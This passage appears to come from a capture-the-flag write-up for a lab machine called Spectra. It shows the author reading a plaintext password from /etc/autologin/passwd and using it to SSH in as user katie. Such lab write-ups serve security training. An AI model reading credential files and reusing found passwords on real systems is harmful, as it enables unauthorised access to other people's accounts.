## Finding Creds
* While looking through the copious number of files on this box, find an interesting file
```bash
nginx@spectra /opt $ cat /etc/autologin/passwd
SummerHereWeCome!!
nginx@spectra /opt $ 
```
* Try to ssh in as user katie with this password
```bash
hunter@kali ~$ ssh katie@10.10.10.229
Password:
katie@spectra ~ $ id
uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
katie@spectra ~ $
```